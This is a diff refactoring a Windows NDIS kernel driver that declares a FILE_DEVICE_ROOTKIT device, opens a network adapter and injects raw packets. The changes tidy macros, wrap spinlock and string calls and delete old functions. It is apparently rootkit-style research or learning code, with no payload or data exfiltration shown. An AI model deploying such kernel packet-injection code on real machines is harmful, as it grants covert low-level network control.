@@ -64,18 +64,25 @@
 		rp->IoStatus.Status = ret; rp->IoStatus.Information = info; IoCompleteRequest(rp, IO_NO_INCREMENT);
 
 /* functions */
+
 	/* basic */
-#define    memzero(            src, len)    memset(                       src,     '\0',len            )
-#define nt_malloc(             len     )    ExAllocatePool(               NonPagedPool, len            )
-#define nt_free(               src     )    ExFreePool(                            src                 )
-#define nt_memzero(            src, len)    RtlZeroMemory(                         src, len            )
-#define nt_memcpy(        dst, src, len)    RtlCopyMemory(                dst,     src, len            )
-#define nt_init_ustring(  dst, src     )    RtlInitUnicodeString(         dst,     src                 )
-#define nt_creat_link(    dst, src     )    IoCreateSymbolicLink(         dst,     src                 )
-#define nt_irp_complete(       ir      )    IoCompleteRequest(                     ir, IO_NO_INCREMENT )
-#define nt_irp_get_stack(      ir      )    IoGetCurrentIrpStackLocation(          ir                  )
-#define nt_unlink_link(        str     )    IoDeleteSymbolicLink(                  str                 )
-#define nt_unlink_dev(         dev     )    IoDeleteDevice(                        dev                 )
+#define    memzero(            src, len)    memset(                        src,     '\0',len       )
+#define nt_malloc(             len     )    ExAllocatePool(                NonPagedPool, len       )
+#define nt_free(               src     )    ExFreePool(                             src            )
+#define nt_memzero(            src, len)    RtlZeroMemory(                          src, len       )
+#define nt_memcpy(        dst, src, len)    RtlCopyMemory(                 dst,     src, len       )
+#define nt_ustring_init(  dst, src     )    RtlInitUnicodeString(          dst,     src            )
+#define nt_ustring_catu(  dst, src     )    RtlAppendUnicodeStringToString(dst,     src            )
+#define nt_ustring_catw(  dst, src     )    RtlAppendUnicodeToString(      dst,     src            )
+#define nt_creat_link(    dst, src     )    IoCreateSymbolicLink(          dst,     src            )
+#define nt_irp_complete(       ir      )    IoCompleteRequest(              ir,     IO_NO_INCREMENT)
+#define nt_irp_get_stack(      ir      )    IoGetCurrentIrpStackLocation(   ir                     )
+#define nt_unlink_link(        str     )    IoDeleteSymbolicLink(          str                     )
+#define nt_unlink_dev(         dev     )    IoDeleteDevice(                dev                     )
+#define nt_splock_init(  lock          )    KeInitializeSpinLock(         lock                     )
+#define nt_splock_lock(  lock, i       )    KeAcquireSpinLock(            lock,     i              )
+#define nt_splock_unlock(lock, i       )    KeReleaseSpinLock(            lock,     i              )
+
 	/* complex */
 #define nt_creat(mod, name, dev) \
 	IoCreateDevice(mod, 0, name, FILE_DEVICE_ROOTKIT, FILE_DEVICE_SECURE_OPEN, false, dev)
@@ -86,55 +93,30 @@
 #define  MODNAME    "pf"
 #define LMODNAME    "pf"
 
-#ifndef RELEASE
+#ifndef RELEASE /* debug output routine */
 #	define printk(  fmt, ...   )    DbgPrint(fmt, __VA_ARGS__)
-#	define printm(    m        )    DbgPrint("%s: %s: %d: %s\n"   ,                       MODNAME, __func__, __LINE__, m      )
-#	define printl                   DbgPrint("%s: %s: %d: "       ,                       MODNAME, __func__, __LINE__         )
-#	define printmd(   m, d     )    DbgPrint("%s: %s: %d: %s: %d (0x%08X)\n",             MODNAME, __func__, __LINE__, m, d, d)
+#	define printm(    m        )    DbgPrint("%s: %s: %d: %s\n"   ,                       MODNAME, __func__, __LINE__, m          )
+#	define printl                   DbgPrint("%s: %s: %d: "       ,                       MODNAME, __func__, __LINE__             )
+#	define printmd(   m, d     )    DbgPrint("%s: %s: %d: %s: %d (0x%08X)\n",             MODNAME, __func__, __LINE__, m, d, d    )
 #	define printdbg(fmt, ...   )    DbgPrint("%s: %s: %d: " ## fmt,                       MODNAME, __func__, __LINE__, __VA_ARGS__)
-#	define DBG_IN                   DbgPrint("%s: == >> %s: %d\n" ,                       MODNAME, __func__, __LINE__         )
-#	define DBG_OUT                  DbgPrint("%s: << == %s: %d\n" ,                       MODNAME, __func__, __LINE__         )
-#	define DBG_OUT_V                DbgPrint("%s: << == %s: %d\n" ,                       MODNAME, __func__, __LINE__         ); return
-#	define DBG_OUT_VM(    m    )    DbgPrint("%s: << == %s: %d: %s\n" ,                   MODNAME, __func__, __LINE__, m      ); return
+#	define DBG_IN                   DbgPrint("%s: == >> %s: %d\n" ,                       MODNAME, __func__, __LINE__             )
+#	define DBG_OUT                  DbgPrint("%s: << == %s: %d\n" ,                       MODNAME, __func__, __LINE__             )
+#	define DBG_OUT_V                DbgPrint("%s: << == %s: %d\n" ,                       MODNAME, __func__, __LINE__             ); return
+#	define DBG_OUT_VM(    m    )    DbgPrint("%s: << == %s: %d: %s\n" ,                   MODNAME, __func__, __LINE__, m          ); return
 
-/* TODO: test and verify */
-/* new */
 /* Return */
-#	define DBG_OUT_R(       r  )    DbgPrint("%s: << == %s: %d\n" ,                       MODNAME, __func__, __LINE__         ); return r
+#	define DBG_OUT_R(       r  )    DbgPrint("%s: << == %s: %d\n" ,                       MODNAME, __func__, __LINE__             ); return r
 /* Return value + Print value */
-#	define DBG_OUT_RP(      r  )    DbgPrint("%s: << == %s: %d: ret = %d (0x%08X)\n",     MODNAME, __func__, __LINE__, r, r   ); return r
+#	define DBG_OUT_RP(      r  )    DbgPrint("%s: << == %s: %d: ret = %d (0x%08X)\n",     MODNAME, __func__, __LINE__, r, r       ); return r
 /* return Void, but Print returned value from the previous call */
-#	define DBG_OUT_VP(      r  )    DbgPrint("%s: << == %s: %d: ret = %d (0x%08X)\n",     MODNAME, __func__, __LINE__, r, r   ); return
+#	define DBG_OUT_VP(      r  )    DbgPrint("%s: << == %s: %d: ret = %d (0x%08X)\n",     MODNAME, __func__, __LINE__, r, r       ); return
 /* Return value, Print returned value and additional Message with information */
-#	define DBG_OUT_RPM(  m, r  )    DbgPrint("%s: << == %s: %d: %s: ret = %d (0x%08X)\n", MODNAME, __func__, __LINE__, m, r, r); return r
+#	define DBG_OUT_RPM(  m, r  )    DbgPrint("%s: << == %s: %d: %s: ret = %d (0x%08X)\n", MODNAME, __func__, __LINE__, m, r, r    ); return r
 /* return Void, Print returned value and additional Message with information */
-#	define DBG_OUT_VPM(  m, r  )    DbgPrint("%s: << == %s: %d: %s: ret = %d (0x%08X)\n", MODNAME, __func__, __LINE__, m, r, r); return
+#	define DBG_OUT_VPM(  m, r  )    DbgPrint("%s: << == %s: %d: %s: ret = %d (0x%08X)\n", MODNAME, __func__, __LINE__, m, r, r    ); return
 
-/* old */
-//#	define DBG_OUT_RET(     r   )  DbgPrint("%s: << == %s: %d\n" ,                       MODNAME, __func__, __LINE__           ); return r
-//#	define DBG_OUT_RET_P(   r   )  DbgPrint("%s: << == %s: %d: ret = %d (0x%08X)\n",     MODNAME, __func__, __LINE__, r  , r   ); return r
-//#	define DBG_OUT_RET_PV(  r   )  DbgPrint("%s: << == %s: %d: ret = %d (0x%08X)\n",     MODNAME, __func__, __LINE__, r  , r   ); return
-//#	define DBG_OUT_RET_PM(  m, r)  DbgPrint("%s: << == %s: %d: %s: ret = %d (0x%08X)\n", MODNAME, __func__, __LINE__, m  , r, r); return r
-//#	define DBG_OUT_RET_PMV( m, r)  DbgPrint("%s: << == %s: %d: %s: ret = %d (0x%08X)\n", MODNAME, __func__, __LINE__, m  , r, r); return
+#else /* silence in release version */
 
-//#	define printdbg( fmt, ...  )    printl; DbgPrint(fmt, __VA_ARGS__)
-
-/*
-#else
-#	define printk(   fmt, ... )
-#	define printm(   msg      )
-#	define printmd(  msg, d   )
-#	define printdbg( msg, d   )
-#	define DBG_IN
-#	define DBG_OUT
-#	define DBG_OUT_V              return
-#	define DBG_OUT_R(   r   )    return r
-#	define DBG_OUT_RET_RP( r   )    return r
-#	define DBG_OUT_RET_M( m, r)    return r
-#	define DBG_OUT_RET_V( m, r)    return
-*/
-
-#else
 #	define printk(    fmt, ... )
 #	define printm(      m      )
 #	define printl
@@ -148,35 +130,22 @@
 #	define DBG_OUT_VP(     r   )    return
 #	define DBG_OUT_RPM( m, r   )    return r
 #	define DBG_OUT_VPM( m, r   )    return
-#	define printdbg( fmt, ...  )
+#	define printdbg(  fmt, ... )
+
 #endif
 
-/* new */
-#define  RET_ON_ERRND_VPM( m, r    )    if (!(IS_ND_OK(r)))   { DBG_OUT_VPM(m, r);           }
-#define  RET_ON_ERRND_RPM( m, r    )    if (!(IS_ND_OK(r)))   { DBG_OUT_RPM(m, r);           }
-#define  RET_ON_ERRND_VP(     r    )    if (!(IS_ND_OK(r)))   { DBG_OUT_VP(    r);           }
-#define  RET_ON_ERRNT_VP(     r    )    if (!(NT_SUCCESS(r))) { DBG_OUT_VP(    r);           }
-#define  RET_ON_ERRNT_RP(     r    )    if (!(NT_SUCCESS(r))) { DBG_OUT_RP(    r);           }
-#define  RET_ON_V_RP(         r, v )    if (r != v)           { DBG_OUT_RP(    r);           }
-#define  RET_ON_V_VM(   v, m       )    if (v)                { DBG_OUT_VM( m   );           }
-#define  RET_ON_V_RPM(  v, m, r    )    if (v)                { DBG_OUT_RPM(m, r);           }
-#define  RET_ON_V_VPM(  v, m, r    )    if (v)                { DBG_OUT_VPM(m, r);           }
+#define  RET_ON_ERRND_VPM( m, r    )    if (!(IS_ND_OK(r)))   { DBG_OUT_VPM(m, r);                }
+#define  RET_ON_ERRND_RPM( m, r    )    if (!(IS_ND_OK(r)))   { DBG_OUT_RPM(m, r);                }
+#define  RET_ON_ERRND_VP(     r    )    if (!(IS_ND_OK(r)))   { DBG_OUT_VP(    r);                }
+#define  RET_ON_ERRNT_VP(     r    )    if (!(NT_SUCCESS(r))) { DBG_OUT_VP(    r);                }
+#define  RET_ON_ERRNT_RP(     r    )    if (!(NT_SUCCESS(r))) { DBG_OUT_RP(    r);                }
+#define  RET_ON_V_RP(         r, v )    if (r != v)           { DBG_OUT_RP(    r);                }
+#define  RET_ON_V_VM(   v, m       )    if (v)                { DBG_OUT_VM( m   );                }
+#define  RET_ON_V_RPM(  v, m, r    )    if (v)                { DBG_OUT_RPM(m, r);                }
+#define  RET_ON_V_VPM(  v, m, r    )    if (v)                { DBG_OUT_VPM(m, r);                }
+#define  RET_ON_NULL(      ptr     )    if (!ptr)             { printm("ENOMEM" ); return NT_ERR; }
 
-/* old */
-/*
-#define  RET_ON_ERR_MV_ND( m, r   )     if (!(IS_ND_OK(r)))   { DBG_OUT_VPM(m, r);           }
-#define  RET_ON_ERR_M_ND(  m, r   )     if (!(IS_ND_OK(r)))   { DBG_OUT_RPM(m, r);            }
-#define  RET_ON_ERR_V_ND(  r      )     if (!(IS_ND_OK(r)))   { DBG_OUT_VP(r);               }
-#define  RET_ON_ERR_V(     r      )     if (!(NT_SUCCESS(r))) { DBG_OUT_VP(r);               }
-#define  RET_ON_ERR(       r      )     if (!(NT_SUCCESS(r))) { DBG_OUT_RP(r);                }
-#define  RET_ON_VAL(       r, v   )     if (r != v)           { DBG_OUT_RP(r);                }
-#define  RET_ON_VAL_MR(    v, m, r)     if (v)                { DBG_OUT_RPM(m, r);            }
-#define  RET_ON_VAL_MRV(   v, m, r)     if (v)                { DBG_OUT_VPM(m, r);           }
-*/
-
-#define  RET_ON_NULL(      ptr     )    if (!ptr)             { printm("ENOMEM"); return NT_ERR; }
-
-
+/* TODO: fix it */
 #define IRP_IFACE 1
 #define IFACE_LEN 38
 
@@ -479,44 +448,6 @@ void ndis_packet_recv(const uchar *packet, int len)
 }
 
 
-void ndis_packet_send_orig(const uchar *packet, int len)
-{
-	nd_ret ret;
-	
-	DBG_IN;
-	
-	/* aquire lock, release only when send is complete */
-	KeAcquireSpinLock(&g_splock, &g_irq);
-	if (g_iface_hndl[g_iface_indx] && packet) {
-		nd_pack *npacket;
-		NdisAllocatePacket(&ret, &npacket, g_packet_pool);
-		if (NDIS_STATUS_SUCCESS == ret) {
-			void *pbuf;
-			nd_buf *nbuf;
-			
-			NdisAllocateMemory(&pbuf, len, 0, g_phymax);
-			memcpy(pbuf, (void *) packet, len);
-			NdisAllocateBuffer(&ret, &nbuf, g_buffer_pool, pbuf, len);
-			if (NDIS_STATUS_SUCCESS == ret) {
-				RESERVED(npacket)->Irp = NULL; /* so our OnSendDone() knows this is local */
-				NdisChainBufferAtBack(npacket, nbuf);
-				NdisSend(&ret, g_iface_hndl[g_iface_indx], npacket);
-				if (ret != NDIS_STATUS_PENDING ) {
-					ndis_send(g_iface_hndl[g_iface_indx], npacket, ret);
-				}
-			} else {
-				DbgPrint("rootkit: error 0x%X NdisAllocateBuffer\n");
-			}
-		} else {
-			DbgPrint("rootkit: error 0x%X NdisAllocatePacket\n");
-		}
-	}
-	/* release so we can send next.. */
-	KeReleaseSpinLock(&g_splock, g_irq);
-	DBG_OUT_V;
-}
-
-
 void ndis_packet_send(const uchar *packet, int len)
 {
 	nd_ret   ret;
@@ -532,13 +463,13 @@ void ndis_packet_send(const uchar *packet, int len)
 	RET_ON_V_VPM((!(IS_ND_OK(ret))), "NdisAllocatePacket", ret);
 	
 	/* aquire lock, release only when send is complete */
-	KeAcquireSpinLock(&g_splock, &g_irq);
+	nt_splock_lock(&g_splock, &g_irq);
 	
 	NdisAllocateMemory(&pbuf, len, 0, g_phymax);
 	memcpy(pbuf, (void *) packet, len);
 	NdisAllocateBuffer(&ret, &nbuf, g_buffer_pool, pbuf, len);
 	if (!(IS_ND_OK(ret))) {
-		KeReleaseSpinLock(&g_splock, g_irq);
+		nt_splock_unlock(&g_splock, g_irq);
 		DBG_OUT_VPM("NdisAllocateBuffer", ret);
 	}
 	
@@ -550,7 +481,7 @@ void ndis_packet_send(const uchar *packet, int len)
 	}
 	
 	/* release so we can send next.. */
-	KeReleaseSpinLock(&g_splock, g_irq);
+	nt_splock_unlock(&g_splock, g_irq);
 	DBG_OUT_V;
 }
 
@@ -638,7 +569,7 @@ void ndis_send(nd_hndl protobind_ctx, nd_pack *npacket, nd_ret s)
 	
 	DBG_IN;
 	
-	KeAcquireSpinLock(&g_splock, &g_irq);
+	nt_splock_lock(&g_splock, &g_irq);
 	
 	i = RSRVD_PCKT_CTX(npacket)->rp;
 	if (i) {
@@ -658,7 +589,7 @@ void ndis_send(nd_hndl protobind_ctx, nd_pack *npacket, nd_ret s)
 		NdisFreePacket(npacket);
 	}
 	
-	KeReleaseSpinLock(&g_splock, g_irq);
+	nt_splock_unlock(&g_splock, g_irq);
 	
 	DBG_OUT_V;
 }
@@ -871,7 +802,7 @@ nt_ret dev_ioctl(dev_obj *dobj, irp *i)
 nt_ret dev_close(dev_obj *dobj, irp *i)
 {
 	DBG_IN;
-	/* TODO: iface_close() ? */
+	iface_close();
 	DBG_OUT_R(NT_OK);
 }
 
@@ -890,140 +821,6 @@ void init_sending(void)
 	nt_free(pckt);
 	
 	DBG_OUT_V;
-}
-
-
-void iface_open_old(wchar_t *iface_name, int iface_len)
-{
-	//g_iface_name = L"\\Device\\{BDB421B0-4B37-4AA2-912B-3AA05F8A0829}" // 38
-	
-	nd_ret ret, err;
-	ustring ifname, tmp;
-	uint mindex = 0;
-	// uchar *tmp = NULL;
-	
-	nd_medm marray = NdisMedium802_3; // specifies a ethernet network
-	
-	DBG_IN;
-	
-	//printm("init global adapter name");
-	
-	DbgPrint("DEVICE(input  s) == %s\n",  iface_name);
-	DbgPrint("DEVICE(input ws) == %ws\n", iface_name);
-	
-	/* WORK
-	printm("init local adapter name");
-	nt_init_ustring(&ifname, iface_name);
-	
-	if (ifname.Buffer) {
-	
-	DbgPrint("ifname  s ==  %s\n", ifname.Buffer);
-	DbgPrint("ifname ws) == %ws\n", ifname.Buffer);
-	} else {
-		DbgPrint("NULL!!1\n");
-	}
-	*/
-	
-	/* CHECK */
-	/*
-	printm("init local adapter name");
-	nt_init_ustring(&g_iface_name, iface_name);
-	
-	if (ifname.Buffer) {
-	
-	DbgPrint("g ifname  s ==  %s\n", g_iface_name.Buffer);
-	DbgPrint("g ifname ws) == %ws\n", g_iface_name.Buffer);
-	} else {
-		DbgPrint("NULL!!1\n");
-	}
-	
-	DbgPrint("g dev path  s ==  %s\n", g_devpath);
-	DbgPrint("g dev path ws == %ws\n", g_devpath);
-	DbgPrint("g dev link  s ==  %s\n", g_devlink);
-	DbgPrint("g dev link ws == %ws\n", g_devlink);
-	*/
-
-	/*
-	g_iface_name.Length = 0;
-	g_iface_name.MaximumLength = iface_len + g_dev_prefix.Length + sizeof(UNICODE_NULL);
-	g_iface_name.Buffer = nt_malloc(g_iface_name.MaximumLength);
-
-	if (!(g_iface_name.Buffer)) {
-		printdbg("MEMORY: NULL\n");
-	}
-	*/
-	//nt_init_ustring(g_iface_name, &g_dev_prefix);
-	/*
-	RtlAppendUnicodeStringToString(&g_iface_name, &g_dev_prefix);
-	RtlAppendUnicodeToString(&g_iface_name, iface_name + g_dev_prefix.Length / sizeof(WCHAR));
-	DbgPrint("DEVICE(global  s) == %s\n", g_iface_name.Buffer);
-	*/
-	
-	/*
-	tmp = nt_malloc(iface_len + g_dev_prefix.Length + sizeof(UNICODE_NULL));
-	if (!(tmp)) {
-		printdbg("MEMORY 2: NULL\n");
-		return;
-	}
-	nt_memzero(tmp, (iface_len + 12 + sizeof(UNICODE_NULL)));
-	memcpy(tmp, "\\Device\\", 10);
-	DbgPrint("DEVICE(tmp1 s) == %s\n", tmp);
-	strcat(tmp, iface_name);
-	DbgPrint("DEVICE(tmp2 s) == %s\n", tmp);
-	strcat(tmp, '\0');
-	DbgPrint("DEVICE(tmp3 s) == %s\n", tmp);
-	*/
-	
-	/*
-	printm("init global adapter name");
-	nt_init_ustring(&g_iface_name, iface_name);
-	
-	DbgPrint("DEVICE(global  s) == %s\n", g_iface_name.Buffer);
-	DbgPrint("DEVICE(global ws) == %ws\n", g_iface_name.Buffer);
-	*/
-	/*
-	g_iface_ready = 1;
-	*/
-	
-	/*
-	DbgPrint("iface_name  s) ==  %s\n", iface_name);
-	DbgPrint("iface_name ws) == %ws\n", iface_name);
-	*/
-	printm("init local adapter name");
-	nt_init_ustring(&ifname, iface_name);
-	
-	DbgPrint("ifname  s) ==  %s\n", ifname.Buffer);
-	DbgPrint("ifname ws) == %ws\n", ifname.Buffer);
-	
-	
-	//nt_init_ustring(&ifname, L"\\Device\\{BDB421B0-4B37-4AA2-912B-3AA05F8A0829}");
-	//nt_init_ustring(&ifname, L"\\Device\\{2D2E989B-6153-4787-913D-807779793B27}");
-	//nt_init_ustring(&ifname, L"\\Device\\{449F621A-04BC-4896-BBCB-7A93708EA9B8}");
-	/* taken from:
-	 * \HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\{...}
-	 */
-	
-	
-	printm("opening adapter");
-	NdisOpenAdapter(&ret, &err, &g_iface_hndl[g_iface_indx], &mindex, &marray, 1, g_proto_hndl, &g_usrctx, &ifname, 0, NULL);
-	if (!(IS_ND_OK(ret))) {
-		if (!(IS_NT_OK(ret))) {
-			printmd("NdisOpenAdapter: error", ret);
-			if (ret = NDIS_STATUS_ADAPTER_NOT_FOUND) {
-				printm("NdisOpenAdapter: adapter not found");
-			}
-			
-			NdisDeregisterProtocol(&ret, g_proto_hndl);
-			if (!(IS_NT_OK(ret))) {
-				printm("NdisDeregisterProtocol: error");
-			}
-			return NT_ERR;
-		}
-	}
-	
-	ndis_iface_open(&g_usrctx, ret, ND_OK);
-	
-	init_sending();
 }
 
 
@@ -1048,7 +845,7 @@ void iface_open(wchar_t *iface_name, int iface_len)
 	nt_memzero(ifname_path.Buffer, ifname_path.MaximumLength);
 	
 	printm("init local adapter name");
-	//nt_init_ustring(&ifname_path, &g_dev_prefix);
+	//nt_ustring_init(&ifname_path, &g_dev_prefix);
 	RtlAppendUnicodeStringToString(&ifname_path, &g_dev_prefix);
 	RtlAppendUnicodeToString(&ifname_path, iface_name);
 	
@@ -1057,7 +854,7 @@ void iface_open(wchar_t *iface_name, int iface_len)
 	
 	//RtlAppendUnicodeStringToString(&ifname_path, iface_name);
 	
-	//nt_init_ustring(&ifname, iface_name);
+	//nt_ustring_init(&ifname, iface_name);
 	/*
 	DbgPrint("ifname  s) ==  %s\n", ifname_path.Buffer);
 	DbgPrint("ifname ws) == %ws\n", ifname_path.Buffer);
@@ -1150,7 +947,7 @@ nt_ret init_ndis(mod_obj *mobj)
 	RET_ON_NULL(g_packet);
 	nt_memzero(g_packet, g_packet_size);
 	
-	KeInitializeSpinLock(&g_splock);
+	nt_splock_init(&g_splock);
 	
 	DBG_OUT_R(NT_OK);
 }
@@ -1166,8 +963,8 @@ nt_ret init_device(mod_obj *mobj)
 	
 	// We set up the name and symbolic link in Unicode
 	printm("init strings for devices");
-	nt_init_ustring(&devname_path, g_devpath);
-	nt_init_ustring(&devname_link, g_devlink);
+	nt_ustring_init(&devname_path, g_devpath);
+	nt_ustring_init(&devname_link, g_devlink);
 	
 	printm("creating device");
 	ret = nt_creat(mobj, &devname_path, &g_device);
@@ -1236,7 +1033,7 @@ void exit_device(mod_obj *mobj)
 	DBG_IN;
 	
 	printm("init string for device");
-	nt_init_ustring(&devname_link, g_devlink);
+	nt_ustring_init(&devname_link, g_devlink);
 	
 	printm("removing device link");
 	nt_unlink_link(&devname_link);
